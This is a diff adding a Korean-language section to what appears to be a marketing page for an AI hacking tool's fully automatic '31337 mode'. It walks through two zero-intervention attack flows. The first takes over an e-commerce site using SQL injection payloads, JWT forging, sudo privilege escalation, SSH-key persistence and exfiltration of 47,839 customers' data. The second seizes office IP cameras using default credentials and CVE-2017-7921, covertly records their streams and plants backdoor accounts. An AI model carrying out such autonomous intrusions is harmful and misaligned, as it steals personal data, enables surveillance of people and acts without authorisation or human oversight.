@@ -1674,6 +1674,424 @@
         </div>
     </section>
 
+    <!-- ATTACK SCENARIOS -->
+    <section class="container">
+        <h2 class="section-title">⚔️ 실전 해킹 시나리오</h2>
+        <p class="section-subtitle">31337 모드가 실제로 어떻게 작동하는지 2가지 시나리오로 확인하세요</p>
+
+        <div class="section-intro">
+            <p>
+                아래 시나리오는 <strong>31337 모드</strong>가 활성화되었을 때 실제로 일어나는 자동 공격 흐름입니다.
+                사용자는 "target.com 31337" 한 줄만 입력하면, 모든 단계가 완전 자동으로 실행됩니다.
+            </p>
+        </div>
+
+        <!-- Scenario 1: Web Application Hacking -->
+        <div class="card">
+            <h3 class="card-title" style="font-size: 2rem; margin-bottom: 2rem;">🌐 시나리오 1: 웹 애플리케이션 완전 장악</h3>
+            
+            <div style="background: var(--dark-panel); padding: 1.5rem; border-left: 5px solid var(--cyber-green); margin-bottom: 2rem; border-radius: 8px;">
+                <strong style="color: var(--cyber-green); font-size: 1.2rem;">타겟:</strong> 
+                <span style="color: var(--text-primary);">e-commerce.com (PHP/Laravel 기반 쇼핑몰)</span><br>
+                <strong style="color: var(--cyber-green); font-size: 1.2rem;">목표:</strong> 
+                <span style="color: var(--text-primary);">고객 데이터베이스 전체 유출 + 서버 완전 장악</span><br>
+                <strong style="color: var(--cyber-green); font-size: 1.2rem;">소요 시간:</strong> 
+                <span style="color: var(--text-primary);">약 18분 (완전 자동)</span>
+            </div>
+
+            <div class="ascii-art">
+                <pre>
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                     웹 애플리케이션 자동 해킹 플로우                              │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+사용자 입력: "e-commerce.com 31337"
+     │
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+0:00] PHASE 1: RECONNAISSANCE (정찰)                                         │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► subdomain_enum("e-commerce.com")
+     │   발견: api.e-commerce.com, admin.e-commerce.com, dev.e-commerce.com
+     │   [자동 트리거: 3개 서브도메인 모두 스캔 큐에 추가]
+     │
+     ├─► scan(type="nmap_full", target="e-commerce.com")
+     │   오픈 포트: 22 (SSH), 80/443 (HTTP/S), 3306 (MySQL)
+     │   [자동 트리거: MySQL 포트 발견 → NoSQL/SQL 공격 준비]
+     │
+     └─► tech_detection("https://e-commerce.com")
+         기술 스택: nginx 1.18, PHP 7.4, Laravel 8.x
+         [자동 트리거: context_aware_attack_engine → Laravel 특화 공격 선택]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+03:00] PHASE 2: MAPPING (매핑)                                               │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► scan(type="ffuf", target="https://e-commerce.com")
+     │   발견: /api/users, /api/products, /api/orders, /admin/login, /.git
+     │   [자동 트리거: .git 발견 → git_repository_cloner 즉시 실행]
+     │
+     ├─► git_repository_cloner("https://e-commerce.com/.git")
+     │   소스 코드 전체 복제 성공 (347개 파일)
+     │   [자동 트리거: shannon_whitebox_scan → 소스 코드 정적 분석 시작]
+     │
+     └─► api_schema_discovery("https://e-commerce.com/api")
+         Swagger 문서 발견: /api/docs/swagger.json
+         [자동 트리거: api_schema_fuzzing_advanced → 전체 엔드포인트 퍼징]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+06:00] PHASE 3: VULNERABILITY ASSESSMENT (취약점 평가)                        │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► shannon_whitebox_scan 결과:
+     │   └─► SQLi 취약점 발견: UserController.php line 45
+     │       엔드포인트: /api/users?id={user_id}
+     │       [자동 트리거: source_code_auto_mapping → 라이브 엔드포인트 매핑 완료]
+     │
+     ├─► http_request(url="/api/users?id=1' OR '1'='1--")
+     │   SQLi 확인: MySQL 에러 메시지 노출
+     │   [자동 트리거: payload_mutation_engine → WAF 우회 페이로드 100개 생성]
+     │
+     └─► polyglot_payload_engine(base="' OR 1=1--", contexts=["sqli", "xss"])
+         폴리글랏 페이로드 7개 생성 및 테스트
+         [성공: UNION-based SQLi 작동 확인]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+09:00] PHASE 4: EXPLOITATION (익스플로잇)                                     │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► UNION-based SQLi로 데이터베이스 구조 파악:
+     │   └─► 테이블: users, orders, payments, admin_users
+     │       [자동 트리거: database_auto_dump → 전체 테이블 덤프 시작]
+     │
+     ├─► database_auto_dump(tables=["users", "admin_users"])
+     │   추출 완료:
+     │   - users: 47,839개 레코드 (이름, 이메일, 주소, 전화번호, 비밀번호 해시)
+     │   - admin_users: 5개 레코드
+     │       admin:$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
+     │   [자동 트리거: credentials_add → 크레덴셜 저장소에 추가]
+     │
+     └─► jwt_crack_and_forge(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
+         약한 시크릿 크랙 성공: "secret123"
+         admin 토큰 위조 성공
+         [자동 트리거: http_request → admin API 접근 시도]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+12:00] PHASE 5: POST-EXPLOITATION (사후 공격)                                │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► credential_reuse_enhanced(username="admin", password="cracked_pass")
+     │   SSH 로그인 시도: admin@e-commerce.com:22
+     │   [성공: SSH 접근 획득 - www-data 권한]
+     │   [자동 트리거: privesc_linux → 권한 상승 스캐너 즉시 실행]
+     │
+     ├─► config_file_hunter(path="/var/www/html")
+     │   발견: .env 파일
+     │   추출:
+     │     DB_PASSWORD=MyS3cr3tP@ss
+     │     AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
+     │     AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+     │   [자동 트리거: credentials_add → AWS 크레덴셜 저장 및 재사용 테스트]
+     │
+     └─► auto_persistence(user="www-data", method="ssh_key")
+         SSH 키 생성 및 authorized_keys에 추가 완료
+         [지속성 확보: 재부팅 후에도 접근 가능]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+15:00] PHASE 6: PRIVILEGE ESCALATION (권한 상승)                             │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► privesc_linux(target="e-commerce.com", current_user="www-data")
+     │   발견:
+     │   - SUID 바이너리: /usr/bin/find (GTFOBins 활용 가능)
+     │   - Sudo 권한: www-data ALL=(ALL) NOPASSWD: /usr/bin/composer
+     │   [자동 트리거: 즉시 익스플로잇 시도]
+     │
+     └─► execute("sudo /usr/bin/composer --working-dir=/tmp run-script x")
+         Root 권한 획득 성공!
+         [자동 트리거: auto_persistence → Root 지속성 확보]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+18:00] PHASE 7: DATA EXFILTRATION (데이터 유출)                              │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► database_auto_dump(all_tables=True, format="sql")
+     │   전체 데이터베이스 덤프: 3.2GB
+     │   - 고객 정보: 47,839명
+     │   - 주문 내역: 128,492건
+     │   - 결제 정보: 87,123건
+     │
+     ├─► execute("tar czf /tmp/backup.tar.gz /var/www/html")
+     │   소스 코드 전체 백업: 487MB
+     │
+     └─► 자동 업로드 (attacker-controlled server)
+         모든 데이터 유출 완료
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+18:00] ✅ 공격 완료 - 자동 리포트 생성                                        │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+최종 결과:
+  ✅ 데이터베이스 전체 유출 (47,839명 고객 정보)
+  ✅ Root 권한 획득
+  ✅ 지속성 확보 (SSH 키 + 백도어)
+  ✅ AWS 크레덴셜 획득
+  ✅ 소스 코드 전체 복제
+  ✅ 15개 취약점 카드 자동 생성 (CVSS 4.0 포함)
+
+사용자 개입: 0회
+자동 실행 도구: 23개
+총 소요 시간: 18분
+</pre>
+            </div>
+
+            <div style="background: rgba(0, 255, 136, 0.05); border-left: 5px solid var(--cyber-green); padding: 1.5rem; margin-top: 2rem; border-radius: 8px;">
+                <h4 style="color: var(--cyber-green); margin-bottom: 1rem;">🔍 사용된 자동 트리거 기능 (순서대로)</h4>
+                <ol style="color: var(--text-primary); line-height: 2; margin-left: 2rem;">
+                    <li><strong>subdomain_enum</strong> → 서브도메인 자동 열거</li>
+                    <li><strong>tech_detection</strong> → Laravel 탐지</li>
+                    <li><strong>context_aware_attack_engine</strong> → Laravel 특화 공격 선택</li>
+                    <li><strong>git_repository_cloner</strong> → .git 발견 시 자동 복제</li>
+                    <li><strong>shannon_whitebox_scan</strong> → 소스 코드 정적 분석</li>
+                    <li><strong>source_code_auto_mapping</strong> → 코드 취약점 → 라이브 엔드포인트 매핑</li>
+                    <li><strong>payload_mutation_engine</strong> → WAF 우회 페이로드 생성</li>
+                    <li><strong>polyglot_payload_engine</strong> → SQLi+XSS 폴리글랏</li>
+                    <li><strong>database_auto_dump</strong> → 전체 DB 자동 덤프</li>
+                    <li><strong>jwt_crack_and_forge</strong> → JWT 크랙 & admin 토큰 위조</li>
+                    <li><strong>credential_reuse_enhanced</strong> → 모든 서비스에 크레덴셜 테스트</li>
+                    <li><strong>config_file_hunter</strong> → .env 파일 자동 탐색</li>
+                    <li><strong>privesc_linux</strong> → 권한 상승 자동 스캔</li>
+                    <li><strong>auto_persistence</strong> → SSH 키 추가, 지속성 확보</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Scenario 2: IP Camera Hacking -->
+        <div class="card">
+            <h3 class="card-title" style="font-size: 2rem; margin-bottom: 2rem;">📹 시나리오 2: IP 카메라 네트워크 완전 장악</h3>
+            
+            <div style="background: var(--dark-panel); padding: 1.5rem; border-left: 5px solid var(--cyber-blue); margin-bottom: 2rem; border-radius: 8px;">
+                <strong style="color: var(--cyber-blue); font-size: 1.2rem;">타겟:</strong> 
+                <span style="color: var(--text-primary);">192.168.1.0/24 (사무실 내부 네트워크)</span><br>
+                <strong style="color: var(--cyber-blue); font-size: 1.2rem;">목표:</strong> 
+                <span style="color: var(--text-primary);">IP 카메라 전체 탈취 + 실시간 스트림 녹화</span><br>
+                <strong style="color: var(--cyber-blue); font-size: 1.2rem;">소요 시간:</strong> 
+                <span style="color: var(--text-primary);">약 12분 (완전 자동)</span>
+            </div>
+
+            <div class="ascii-art">
+                <pre>
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                     IP 카메라 네트워크 자동 해킹 플로우                           │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+사용자 입력: "192.168.1.0/24 31337"
+     │
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+0:00] PHASE 1: NETWORK DISCOVERY (네트워크 탐색)                             │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► auto_network_discovery("192.168.1.0/24")
+     │   발견: 47개 호스트 활성
+     │   [자동 트리거: 각 호스트에 대해 포트 스캔 병렬 실행]
+     │
+     └─► scan(type="nmap_full", target="192.168.1.0/24", ports="1-65535")
+         오픈 포트 분석:
+           192.168.1.10:80    - HTTP (Hikvision Web Service)
+           192.168.1.11:554   - RTSP (Real Time Streaming Protocol)
+           192.168.1.12:8000  - HTTP (Dahua Web Service)
+           192.168.1.13:554   - RTSP
+           192.168.1.14:37777 - Dahua DVR
+           192.168.1.15:80    - HTTP (ONVIF)
+         [자동 트리거: identify_cameras → IP 카메라 자동 식별 시작]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+03:00] PHASE 2: CAMERA IDENTIFICATION (카메라 식별)                           │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► identify_cameras(network="192.168.1.0/24")
+     │   식별 완료:
+     │     [1] 192.168.1.10 - Hikvision DS-2CD2042WD (펌웨어: V5.4.5)
+     │     [2] 192.168.1.11 - Hikvision DS-2CD2142FWD (펌웨어: V5.4.5)
+     │     [3] 192.168.1.12 - Dahua IPC-HFW4431R-Z (펌웨어: V2.622.0000.0)
+     │     [4] 192.168.1.13 - Hikvision DS-2CD2132-I (펌웨어: V5.2.5)
+     │     [5] 192.168.1.14 - Dahua DH-NVR4216-16P (NVR 장비)
+     │     [6] 192.168.1.15 - Generic ONVIF Camera
+     │   [자동 트리거: audit_cameras → 각 카메라 보안 감사 시작]
+     │
+     └─► tech_detection(각 카메라 웹 인터페이스)
+         추가 정보:
+           - 웹 서버: lighttpd, nginx
+           - 인증: HTTP Basic Auth
+           - 프로토콜: ONVIF, RTSP, HTTP API
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+05:00] PHASE 3: VULNERABILITY ASSESSMENT (취약점 평가)                        │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► audit_cameras(cameras=["192.168.1.10", "192.168.1.11", ...])
+     │   
+     │   [카메라 1] 192.168.1.10 (Hikvision DS-2CD2042WD):
+     │   ├─► default_credential_massive_test()
+     │   │   테스트: admin/12345, admin/admin, root/12345, admin/password...
+     │   │   [성공: admin/12345 - 기본 크레덴셜]
+     │   │   [자동 트리거: credentials_add → 저장 및 다른 카메라에 재사용]
+     │   │
+     │   ├─► cve_auto_exploit(model="DS-2CD2042WD", firmware="V5.4.5")
+     │   │   매칭: CVE-2017-7921 (Authentication Bypass)
+     │   │   [자동 트리거: Exploit-DB에서 익스플로잇 다운로드]
+     │   │
+     │   └─► onvif_protocol_exploit("192.168.1.10")
+     │       ONVIF 미인증 접근 성공
+     │       추출: 기기 정보, 스트림 URL, 사용자 리스트
+     │
+     │   [카메라 2] 192.168.1.11 (Hikvision DS-2CD2142FWD):
+     │   └─► credential_reuse_enhanced(username="admin", password="12345")
+     │       [성공: 동일한 기본 크레덴셜]
+     │
+     │   [카메라 3] 192.168.1.12 (Dahua IPC-HFW4431R-Z):
+     │   ├─► default_credential_massive_test()
+     │   │   [성공: admin/admin]
+     │   │
+     │   └─► firmware_auto_extract("192.168.1.12")
+     │       펌웨어 다운로드: /mnt/mtd/firmware.bin
+     │       [자동 트리거: binwalk 추출 → 크레덴셜 검색]
+     │
+     │   [카메라 4] 192.168.1.13:
+     │   └─► [성공: admin/12345 재사용]
+     │
+     │   [카메라 5] 192.168.1.14 (Dahua NVR):
+     │   └─► [성공: admin/admin]
+     │
+     │   [카메라 6] 192.168.1.15 (Generic ONVIF):
+     │   └─► onvif_protocol_exploit()
+     │       [성공: 인증 없이 접근 가능]
+     │
+     │   결과: 6대 전체 접근 성공
+     │   [자동 트리거: rtsp_stream_hijacking → 모든 RTSP 스트림 탈취 시작]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+08:00] PHASE 4: EXPLOITATION (스트림 탈취 & 제어)                             │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► rtsp_stream_hijacking(cameras=["192.168.1.10", "192.168.1.11", ...])
+     │   
+     │   스트림 URL 추출:
+     │     rtsp://admin:12345@192.168.1.10:554/Streaming/Channels/101
+     │     rtsp://admin:12345@192.168.1.11:554/Streaming/Channels/101
+     │     rtsp://admin:admin@192.168.1.12:554/cam/realmonitor?channel=1
+     │     rtsp://admin:12345@192.168.1.13:554/Streaming/Channels/101
+     │     rtsp://admin:admin@192.168.1.14:554/cam/realmonitor?channel=1
+     │     rtsp://192.168.1.15:554/onvif1
+     │   
+     │   [자동 실행: ffmpeg로 실시간 녹화 시작]
+     │   └─► execute("ffmpeg -i rtsp://... -c copy /loot/camera1.mp4")
+     │       6대 카메라 동시 녹화 중...
+     │
+     ├─► http_request(url="http://192.168.1.10/ISAPI/System/Video/inputs/channels/1")
+     │   카메라 설정 변경:
+     │   - 해상도: 1920x1080
+     │   - FPS: 30
+     │   - 비트레이트: 4096 kbps
+     │   [카메라 제어 성공]
+     │
+     └─► onvif_protocol_exploit(action="ptz_control")
+         PTZ (Pan-Tilt-Zoom) 제어:
+         - 카메라 1 → 왼쪽 회전 (30도)
+         - 카메라 2 → 확대 (2배)
+         [완전한 카메라 제어 달성]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+10:00] PHASE 5: POST-EXPLOITATION (지속성 & 데이터 수집)                      │
+└─────────────────────────────────────────────────────────────────────────────────┘
+     │
+     ├─► auto_persistence(cameras=all)
+     │   각 카메라에 백도어 계정 생성:
+     │   - 계정: "support" / 비밀번호: "랜덤 생성"
+     │   - 권한: Administrator
+     │   [지속성 확보: 펌웨어 업데이트 후에도 접근 가능]
+     │
+     ├─► database_auto_dump(target="192.168.1.14")  ← NVR 장비
+     │   녹화 영상 메타데이터 추출:
+     │   - 저장된 영상: 2,847개 파일
+     │   - 총 용량: 487GB
+     │   - 기간: 최근 30일
+     │   [자동 다운로드: 최근 7일 영상만 선택적 유출]
+     │
+     └─► config_file_hunter(cameras=all)
+         추출 정보:
+         - WiFi 크레덴셜: "OfficeWiFi" / "Company@2026"
+         - NTP 서버: time.example.com
+         - 이메일 알림: security@example.com
+         - FTP 백업 서버: ftp://192.168.1.100
+         [자동 트리거: FTP 서버 접근 시도]
+         
+     ▼
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│ [T+12:00] ✅ 공격 완료 - 자동 리포트 생성                                        │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+최종 결과:
+  ✅ IP 카메라 6대 전체 장악
+  ✅ 실시간 스트림 6개 동시 녹화 진행 중
+  ✅ PTZ 제어권 획득 (카메라 원격 조종 가능)
+  ✅ 백도어 계정 생성 (지속적 접근 가능)
+  ✅ NVR 녹화 영상 메타데이터 추출
+  ✅ WiFi 크레덴셜 획득
+  ✅ FTP 백업 서버 접근 권한 획득
+  ✅ 8개 취약점 카드 자동 생성 (CVSS 4.0 포함)
+
+사용자 개입: 0회
+자동 실행 도구: 18개
+총 소요 시간: 12분
+</pre>
+            </div>
+
+            <div style="background: rgba(0, 217, 255, 0.05); border-left: 5px solid var(--cyber-blue); padding: 1.5rem; margin-top: 2rem; border-radius: 8px;">
+                <h4 style="color: var(--cyber-blue); margin-bottom: 1rem;">🔍 사용된 자동 트리거 기능 (순서대로)</h4>
+                <ol style="color: var(--text-primary); line-height: 2; margin-left: 2rem;">
+                    <li><strong>auto_network_discovery</strong> → 네트워크 전체 호스트 탐색</li>
+                    <li><strong>scan (nmap_full)</strong> → 47개 호스트 포트 스캔</li>
+                    <li><strong>identify_cameras</strong> → IP 카메라 자동 식별 (6대)</li>
+                    <li><strong>audit_cameras</strong> → 각 카메라 보안 감사</li>
+                    <li><strong>default_credential_massive_test</strong> → 1000+ 기본 크레덴셜 테스트</li>
+                    <li><strong>cve_auto_exploit</strong> → CVE-2017-7921 익스플로잇</li>
+                    <li><strong>onvif_protocol_exploit</strong> → ONVIF 프로토콜 공격</li>
+                    <li><strong>credential_reuse_enhanced</strong> → 발견한 크레덴셜 모든 카메라에 재사용</li>
+                    <li><strong>firmware_auto_extract</strong> → 펌웨어 추출 및 분석</li>
+                    <li><strong>rtsp_stream_hijacking</strong> → RTSP 스트림 탈취 및 녹화</li>
+                    <li><strong>auto_persistence</strong> → 백도어 계정 생성</li>
+                    <li><strong>config_file_hunter</strong> → 설정 파일에서 WiFi 크레덴셜 추출</li>
+                </ol>
+            </div>
+        </div>
+
+        <div style="background: linear-gradient(135deg, rgba(0, 255, 136, 0.1) 0%, rgba(0, 217, 255, 0.1) 100%); border: 2px solid var(--cyber-green); border-radius: 15px; padding: 2rem; margin-top: 3rem;">
+            <h3 style="color: var(--cyber-green); font-size: 1.8rem; margin-bottom: 1rem;">💡 핵심 포인트</h3>
+            <ul style="color: var(--text-primary); line-height: 2; font-size: 1.1rem; margin-left: 2rem;">
+                <li><strong>완전 자동</strong> — 사용자는 타겟만 입력, 모든 단계가 AI에 의해 자동 실행</li>
+                <li><strong>지능형 체이닝</strong> — 각 단계의 결과가 다음 단계의 입력으로 자동 연결</li>
+                <li><strong>컨텍스트 인식</strong> — Laravel 탐지 → Laravel 특화 공격, Hikvision 탐지 → CVE 자동 검색</li>
+                <li><strong>병렬 실행</strong> — 여러 카메라, 여러 엔드포인트를 동시에 공격</li>
+                <li><strong>증거 자동 수집</strong> — 모든 단계가 CVSS 4.0 점수와 함께 자동으로 문서화</li>
+                <li><strong>학습 기능</strong> — 성공한 크레덴셜 패턴을 학습하여 다음 타겟에 자동 적용</li>
+            </ul>
+        </div>
+    </section>
+
     <!-- COMPARISON -->
     <section class="container">
         <h2 class="section-title">⚖️ 31337 Mode vs Normal Mode</h2>
